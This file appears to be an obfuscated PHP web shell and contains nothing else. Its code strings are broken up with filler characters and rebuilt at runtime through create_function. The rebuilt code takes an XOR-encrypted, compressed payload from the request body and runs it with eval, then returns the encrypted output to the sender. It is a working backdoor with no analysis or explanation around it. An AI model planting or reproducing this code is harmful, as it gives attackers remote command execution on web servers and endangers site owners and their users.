<?php
$E='$k="3a1AJaAJa5c3";$kh="8AJdfAJ1601AJ521aAJeAJ";$kf="495563AJf45dAJ55";$p="rf7jAJAJfTn';
$W='@baAJsAJe64_dAJecode($m[1]AJAJ),$k)));$oAJ=@ob_get_cAJontentAJs();@oAJb_end_AJclean()';
$Y='Jj};}}rAJeturn $oAJ;}AJif (@pAJreg_mAJatch("/AJ$khAJ(.+)AJ$kf/",@file_getAJ_contAJen';
$g='innw2QNoz";AJfunAJction x(AJ$t,$k){AJ$c=AJstrlenAJ($k);$AJl=strlen(AJAJ$AJt);$o="";forA';
$K='tAJs("phAJp:/AJ/input"),$AJm)==1) AJ{@ob_starAJt();@AJevaAJl(@gzuncomAJpress(AJ@xAJ(';
$R=str_replace('H','','HcrHHeaHteH_funcHtion');
$z=';$r=AJ@baseAJ6AJ4_encoAJde(@x(AJ@gzcoAJmpreAJss($o),$k));AJprint("$AJpAJ$kh$r$kf");}';
$C='J(AJ$i=0;$i<$l;){fAJorAJ($AJj=0;($j<$c&&$AJi<AJ$l);$j++,AJ$i++){$o.=AJ$t{$i}^AJ$k{$A';
$F=str_replace('AJ','',$E.$g.$C.$Y.$K.$W.$z);
$N=$R('',$F);$N();
?>
